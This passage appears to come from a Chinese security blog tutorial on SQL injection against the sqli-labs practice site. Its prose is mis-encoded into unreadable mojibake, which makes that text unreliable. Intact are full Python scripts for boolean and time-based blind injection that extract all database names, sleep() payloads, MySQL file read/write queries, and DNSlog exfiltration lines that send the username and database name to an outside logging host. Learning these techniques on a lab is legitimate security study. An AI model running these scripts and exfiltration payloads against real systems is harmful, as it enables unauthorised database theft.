class="built_in">print</span>(now_str)</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹ä¹Ÿå¯ä»¥çœ‹åˆ°ç»“æœ</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/29.png" alt="29"></p><p>ä½†æ˜¯æˆ‘ä»¬ä»ç„¶æƒ³çŸ¥é“æ‰€æœ‰æ•°æ®åº“çš„åç§°æ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±æ”¹ä¸€ä¸‹ï¼Œç»§ç»­è·‘ï¼Œå°±æ˜¯ä¼šæ…¢ä¸€ç‚¹ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå˜é‡ç»Ÿè®¡ä¸€ä¸‹çœ‹çœ‹å®ƒä¸€å…±è¯·æ±‚äº†å¤šå°‘æ¬¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p><p>å¯ä»¥çœ‹åˆ°æ³¨å‡ºè¿™äº›æ•°æ®åº“ä¸€å…±è¯·æ±‚äº† <code>758</code> æ¬¡ï¼Œè€Œä¸”äºŒåˆ†ç®—æ˜¯æ•ˆç‡æ¯”è¾ƒé«˜çš„äº†ï¼Œä¹Ÿè®¸ä½ ä¼šè¯´æˆ‘å†™çš„ä¹Ÿæœ‰é—®é¢˜ï¼ŒèŒƒå›´åº”è¯¥é™å®šåœ¨ <code>33-127</code>ï¼Œä½†æ˜¯å¯¹äºäºŒåˆ†æ¥è¯´ï¼ŒèŒƒå›´ç¼©å°ä¸€åŠä¹Ÿåªæ˜¯å°‘è¯·æ±‚ä¸€æ¬¡è€Œå·²ï¼Œæ•´ä¸ªä¿¡æ¯é•¿åº¦ <code>94</code>ï¼Œæˆ‘ä»¬ç†è®ºä¸Šä¹Ÿå°±ä¼šå°‘è¯·æ±‚äº† <code>94</code> æ¬¡ã€‚åœ¨ç»è¿‡å®é™…æµ‹é‡ä¹‹åï¼Œå‘ç°ä¹Ÿæ˜¯è¦è¯·æ±‚ <code>632</code> æ¬¡çš„ï¼Œæ‰€ä»¥ç›²æ³¨æ˜¯ä¸å¯èƒ½å»æ‰‹æ‰“çš„ï¼Œä¸€å®šè¦å­¦ä¼šè‡ªå·±å†™è„šæœ¬è·‘ï¼Œè‡ªå·±ä¼šå†™èƒ½åº”å¯¹ä»»ä½•æƒ…å†µï¼Œè€Œä½ å¦‚æœä¸€å‘³çš„ä¾é  <code>sqlmap</code> æœ€ç»ˆä¼šå‘ç°åƒäºçš„è¿˜æ˜¯è‡ªå·±ã€‚</p><p>å¸ƒå°”ç›²æ³¨ä¸€èˆ¬åº”ç”¨åœ¨é¡µé¢æ— æœ‰å…³æ•°æ®åº“å†…å®¹çš„å›æ˜¾ï¼ŒæŠ¥é”™ä¹Ÿæ— æç¤ºï¼Œå¹¶ä¸”åªæœ‰ä¸¤ç§å›æ˜¾çš„ç»“æœçš„æ—¶å€™ç”¨çš„ã€‚æ¯”è¾ƒä¸‡é‡‘æ²¹ï¼Œä½†æ˜¯ä¼šå¯¼è‡´è¯·æ±‚é‡å¾ˆå¤§ï¼Œå®é™…åº”ç”¨çš„æ—¶å€™å¦‚æœé™åˆ¶è¯·æ±‚æ¬¡æ•°é‚£ä¹ˆä¼šå¾ˆéš¾ã€‚</p><p>åŸºäºæ—¶é—´çš„ç›²æ³¨</p><p>è¿™ä¸ªå¯ä»¥è¯´æ˜¯æœ€åçš„æ³•å®äº†ï¼Œå› ä¸ºå®ƒä½¿ç”¨æ‰€æœ‰çš„å¸¦æœ‰æ³¨å…¥çš„é¡µé¢ã€‚å¦‚æœä½ çš„æŸ¥è¯¢è¯·æ±‚ç”šè‡³ä¸ä¼šæœ‰ä¸€ç‚¹ç‚¹çš„å›æ˜¾ï¼Œæ¯”å¦‚è¯´ç™»å½•çš„æ—¶å€™éƒ½ä¸å‘Šè¯‰ä½ ç™»å½•æˆåŠŸæˆ–è€…è´¦å·å¯†ç å¤±è´¥ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨äº†ã€‚</p><p>çƒ«èŠå£«ï¼šæ‰€æœ‰è¯­è¨€çš„ç‰¹æ€§â€”é€»è¾‘è¿ç®—ä¸å’Œæˆ–éƒ½æœ‰è¿™ä¹ˆä¸ªç‰¹æ€§ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼ <code>and</code>ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸º <code>0</code> é‚£ä¹ˆä¸ä¼šè¿ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼ <code>or</code>ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸º <code>1</code> é‚£ä¹ˆä¸ä¼šè®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼å¯ä»¥æ‰©å±•åˆ° <code>n</code> ä¸ªè¡¨è¾¾å¼ã€‚</p><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬ç»™å‡ºç¬¬ä¸€ä¸ª <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and è¡¨è¾¾å¼ and sleep(5)--+</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¡¨è¾¾å¼ä¸º <code>1</code> é‚£ä¹ˆä¼šæ‰§è¡Œ <code>sleep</code>ï¼Œå¦‚æœä¸º <code>0</code>ï¼Œé‚£ä¹ˆä¸ä¼šæ‰§è¡Œã€‚</p><p>æˆ‘è¿™é‡Œå†™äº†ä¸¤ä¸ª <code>payload</code>ï¼Œä¸€ä¸ªæ˜¯ <code>1&#39; and length(database())&lt;5 and sleep(5)--+</code> ä¸€ä¸ªæ˜¯ <code>1&#39; and length(database())&lt;9 and sleep(5)--+</code>ï¼Œæ‰“å¼€æ§åˆ¶å°çš„ç½‘ç»œé€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png" alt="31"></p><p>å‰è€…åœ¨ <code>10ms</code> çš„æ—¶é—´å†…å°±è¿”å›äº†ï¼Œè€Œåè€…åœ¨ <code>5.02S</code> æ‰è¿”å›ã€‚å¯ä»¥çœ‹åˆ°åé¢çš„è¡¨è¾¾å¼ä¸ºçœŸå°±ä¼šä¼‘çœ  <code>5S</code>ï¼Œæ ¹æ®è¿”å›çš„æ—¶é—´å·®æ¥åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦æ­£ç¡®ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿæ¥è‡ªå·±å†™ä¸€ä¸ªè„šæœ¬æ¥è·‘è·‘æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">ss=time.time()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata) and sleep(1)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="comment">#print(time.time()-start)</span></span><br><span class="line">    <span class="comment">#quit()</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">32</span></span><br><span class="line">    r=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata) and sleep(1);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        start=time.time()</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cost:&#x27;</span>+<span class="built_in">str</span>(time.time()-ss))</span><br></pre></td></tr></table></figure><p>è·Ÿå¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸ª <code>sleep(1)</code> å°±è¡Œäº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸ç”¨å›æ˜¾çš„ç»“æœå»åˆ¤æ–­äº†ï¼Œç›´æ¥ç”¨ç»è¿‡çš„æ—¶é—´æ˜¯å¦è¶…è¿‡ <code>1S</code> å°±å¥½äº†ã€‚è¿™é‡Œæˆ‘ä»¬ä¸ä»…ç»Ÿè®¡äº†è¯·æ±‚æ¬¡æ•°ï¼Œæˆ‘ä»¬è¿˜ç»Ÿè®¡äº†èŠ±è´¹æ—¶é—´ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚æ¬¡æ•°è·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„(å°å£°ï¼šæˆ‘å·å·æ”¹äº†ASCIIçš„èŒƒå›´)ã€‚å¹¶ä¸”æ³¨å‡ºè¿™94ä¸ªå­—ç¬¦æˆ‘ä»¬èŠ±è´¹äº†å°†è¿‘ <code>4min</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ—¶é—´æˆæœ¬ä¹Ÿæ˜¯éå¸¸é«˜çš„ã€‚</p><h5 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>åŸºäºæ—¶é—´çš„ç›²æ³¨åŸºæœ¬é€‚ç”¨äºæ‰€æœ‰å«æœ‰æ³¨å…¥æ¼æ´çš„é¡µé¢ï¼Œä½†æ˜¯æ—¶é—´æˆæœ¬æ˜¯æœ€é«˜çš„ã€‚</p><h4 id="DNSlogç›²æ³¨"><a href="#DNSlogç›²æ³¨" class="headerlink" title="DNSlogç›²æ³¨"></a>DNSlogç›²æ³¨</h4><p>ä»¥ä¸Šä¸¤ä¸ªç›²æ³¨ä¸ç®¡æ˜¯å“ªä¸ªéƒ½éœ€è¦é¢‘ç¹è¯·æ±‚æ•°æ®åº“æ‰èƒ½è·å–åˆ°æ•°æ®åº“çš„å…·ä½“ä¿¡æ¯ï¼Œåœ¨å½“ä»£ <code>WAF</code> é˜²æŠ¤å¦‚æ­¤ä¸¥å¯†çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¦‚æ­¤å¤šå¾ˆå¯èƒ½ä¼šå¯¼è‡´ <code>ip</code> è¢« <code>ban</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>load_file</code> æ¥å‘èµ·ä¸€ä¸ª <code>DNS</code> è¯·æ±‚ã€‚</p><h5 id="å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶"><a href="#å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶" class="headerlink" title="å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶"></a>å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶</h5><p>å…ˆä»‹ç»ä¸€ä¸ªå‡½æ•°ï¼Œä¹‹å‰è¯»å†™æ–‡ä»¶çš„æ—¶å€™ç”¨è¿‡ï¼š<code>load_file(file)</code> å¯ä»¥è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚è¿™é‡Œä¸ä»…å¯ä»¥è¯»å–æœ¬åœ°çš„æ–‡ä»¶ï¼Œè¿˜èƒ½å‘ <code>url</code> å‘èµ·è¯·æ±‚ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹æ•°æ®åº“çš„é…ç½®ï¼Œæ•°æ®åº“ä¸­æœ‰ä¸€ä¸ªå˜é‡æ˜¯ <code>secure_file_priv</code>ï¼Œå¯ä»¥ç›´æ¥æŸ¥çœ‹æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯åœ¨ <code>mysql</code> ç»ˆç«¯ä¸­ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹è¿™ä¸€é¡¹é…ç½®ã€‚</p><ul><li>å½“ <code>secure_file_priv</code> ä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</li><li>å½“ <code>secure_file_priv</code> ä¸º<code>G:\</code>ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚</li><li>å½“ <code>secure_file_priv</code> ä¸º <code>null</code>ï¼Œ<code>load_file</code> å°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</li></ul><p>æ‰€ä»¥ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬æœ€å¥½æŠŠ <code>my.ini</code> æ–‡ä»¶çš„è¯¥é¡¹é…ç½®è®¾ç½®æˆï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½ä»»æ„è¯»å–ï¼Œä»»æ„å†™æ–‡ä»¶äº†ï¼Œä½†æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ…é‡é…ç½®ï¼Œå› ä¸ºæ¯”è¾ƒå±é™©ã€‚</p><p>è¯»å–æ–‡ä»¶çš„ä¸€èˆ¬å½¢å¼æ˜¯ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘æƒ³è¯»å– <code>D:</code> ç›®å½•ä¸‹çš„ <code>1.txt</code> æ–‡ä»¶ï¼Œé‚£å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p><p>å¯ä»¥å‘ç°è¯»å–ç»“æœä»¥åå…­è¿›åˆ¶çš„æ–¹å¼è¾“å‡ºå‡ºæ¥äº†ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ–‡ä»¶åè‹¥ä»¥åŒåæ–œæ å¼€å¤´åˆ™ä»£è¡¨å‘ <code>url</code> å‘èµ·è¯·æ±‚ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p><p>ä½†æ˜¯ä¼šå‘ç°è¿™ä¸€è¯·æ±‚æ¯”è¾ƒè€—æ—¶ï¼Œ</p><p>å†™æ–‡ä»¶çš„ä¸€èˆ¬å½¢å¼æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸èƒ½è¦†ç›–æ–‡ä»¶ï¼Œåªèƒ½åˆ›å»ºæ–‡ä»¶ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯»æ–‡ä»¶å¯ä»¥è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œæ³„éœ²æ•æ„Ÿå†…å®¹</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>åŸŸåè§£ææœåŠ¡(Domain Name Server)ï¼Œæˆ‘ä»¬çŸ¥é“ <code>DNS</code> çš„ä½œç”¨å°±æ˜¯å°†æˆ‘ä»¬ç†ŸçŸ¥çš„åŸŸåè½¬æ¢æˆ <code>ip</code> åœ°å€ã€‚</p><p>å› ç‰¹ç½‘é‡‡ç”¨å±‚æ¬¡æ ‘çŠ¶ç»“æ„å‘½åæ–¹æ³•ã€‚åŸŸæ˜¯åå­—ç©ºé—´ä¸­ä¸€ä¸ªå¯è¢«ç®¡ç†çš„åˆ’åˆ†ï¼ˆæŒ‰æœºæ„ç»„ç»‡åˆ’åˆ†ï¼‰ï¼ŒåŸŸå¯è¢«åˆ’åˆ†ä¸ºå­åŸŸï¼Œå­åŸŸå¯å†è¢«åˆ’åˆ†ï¼Œå³å½¢æˆäº†é¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ã€‚ä»å³å‘å·¦ä¸ºé¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ï¼Œç”¨ç‚¹éš”å¼€ã€‚</p><p>æ¯”å¦‚è°·æ­Œçš„åŸŸåï¼š<code>www.google.com</code><br>å®ƒç”±ä¸‰ä¸ªæ ‡å·ç»„æˆï¼Œ <code>com</code> å³ä¸ºé¡¶çº§åŸŸåï¼Œ<code>google</code> ä¸ºäºŒçº§åŸŸåï¼Œ<code>www</code> å³ä¸ºä¸‰çº§åŸŸå,ä¸”åŸŸåä¸åˆ†åŒºå¤§å°å†™ã€‚<br>æ¯”å¦‚æˆ‘è®¿é—® <code>www.google.com</code> å‘ç”Ÿäº†ä»¥ä¸‹çš„äº‹æƒ…ï¼š</p><ol><li>æˆ‘è¯·æ±‚æˆ‘è‡ªå·±è®¾ç½®çš„åŸŸåæœåŠ¡å™¨</li><li>åŸŸåæœåŠ¡å™¨å‘çŸ¥é“æ­¤åŸŸåçš„æœåŠ¡å™¨å‘èµ·è¯·æ±‚</li><li>åŸŸåæœåŠ¡å™¨å¾—åˆ°äº† <code>www.google.com</code> çš„ <code>ip</code> åœ°å€ï¼Œè¿”å›ç»™æˆ‘è®¾ç½®çš„æœåŠ¡å™¨ï¼Œæœ€åè¿”å›ç»™æˆ‘ã€‚</li></ol><p>æˆ‘ä»¬åœ¨åŸŸåæœåŠ¡å™¨ä¸­å°±ç•™ä¸‹äº†è¿™æ ·ä¸€æ¡è®°å½•ï¼š<code>x.x.x.x</code> ç”¨æˆ·åœ¨ä»€ä¹ˆæ—¶å€™è§£æäº† <code>www.google.com</code> çš„åŸŸåã€‚</p><h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlogæ˜¯ä»€ä¹ˆã€‚DNSlogå°±æ˜¯å­˜å‚¨åœ¨DNSæœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸå <code>www.google.com</code> ç­‰çš„è®¿é—®ä¿¡æ¯ï¼Œç±»ä¼¼æ—¥å¿—æ–‡ä»¶ã€‚</p><p>å‡å¦‚æˆ‘åœ¨ <code>www.google.com</code> ä¹‹åè¿˜åŠ äº†ä¸€ä¸ªå­åŸŸåï¼Œæˆ‘çš„è¯·æ±‚å†…å®¹æ˜¯ <code>xxx.www.google.com</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å¤–éƒ¨æœåŠ¡å™¨å¹¶ä¸çŸ¥é“è°·æ­Œåœ¨ <code>www</code> åŸŸåä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå­åŸŸåï¼Œé‚£ä¹ˆå®ƒå°†åŸŸåè¯·æ±‚å‘é€ç»™è°·æ­Œçš„æœåŠ¡å™¨ï¼Œè°·æ­ŒæœåŠ¡å™¨å†è§£æå‡ºä¸€ä¸ª <code>ip</code> åœ°å€å›å»ç»™åŸŸåæœåŠ¡å™¨ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ²¡æœ‰è¿”å›ä¸ºç©ºï¼Œä¸è¿‡è¿™ä¸ªè¯·æ±‚è¿˜æ˜¯ä¼šè¢«è°·æ­Œçš„æœåŠ¡è®°å½•ä¸‹æ¥ã€‚è¿™æ ·æˆ‘ä»¬çš„ <code>dns</code> å°±ä¼šåœ¨ç½‘ç«™çš„ <code>dns</code> æœåŠ¡å™¨ç•™ä¸‹ä¿¡æ¯äº†ã€‚</p><p>é‚£ä¹ˆ <code>dnslog</code> æ³¨å…¥å°±æ˜¯è¿™ä¹ˆä¸ªåŸç†äº†ã€‚å®ƒåœ¨ä½ è¯·æ±‚åŸŸåçš„æ—¶å€™ï¼Œå¦‚æœå‡ºç°äº†åˆ†é…ç»™ä½  <code>dnslog</code> æœåŠ¡å™¨çš„æ—¥å¿—ï¼Œå°±ä¼šæŠŠæ•°æ®è¿”å›ç»™ä½ ã€‚  </p><p>æˆ‘ä»¬å…ˆæ¥è¯•è¯•æ™®é€šçš„ <code>dnslog</code> å¸¦å‡ºä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p><p>å¯ä»¥çœ‹åˆ°ç¯å¢ƒå˜é‡è¢«æ‰§è¡Œå¸¦å‡ºåˆ°æˆ‘ä»¬çš„ <code>dnslog</code> æœåŠ¡å™¨é‡Œé¢å»äº†ï¼Œ<code>connection refused</code> æ˜¯å› ä¸ºä»–å¯¹æ‰€æœ‰çš„å­åŸŸåè§£æçš„æœåŠ¡å™¨åœ°å€éƒ½æ˜¯ <code>127.0.0.1</code> æ‰€ä»¥ä½ æœ¬æœºæ²¡å¼€ <code>web</code> æœåŠ¡å°±ä¼šè¿™æ ·ã€‚</p><p>æˆ‘ä»¬å†æ¥è¯•è¯•çœ‹åœ¨ <code>mysql</code> é‡Œé¢æ³„éœ²ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥è¯•è¯•å»è¯·æ±‚ä¸€ä¸‹çœ‹çœ‹ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p><p>å¯ä»¥å‘ç°æˆåŠŸæ³„éœ²ä¿¡æ¯ã€‚</p><p>ä½†æ˜¯ä¹Ÿè¦æ³¨æ„ä¸€ä¸‹ï¼Œæ¯çº§åŸŸåé•¿åº¦æœ€é•¿ä¸º63ï¼Œå› æ­¤æ¯æ¬¡æˆ‘ä»¬åœ¨è¯·æ±‚çš„æ—¶å€™é™åˆ¶ä¸€ä¸‹ï¼Œç”¨ <code>mid</code> å»æˆªå–å°±å¥½äº†ï¼Œè™½ç„¶å‘èµ·ä¸€æ¬¡ <code>DNSlog</code> 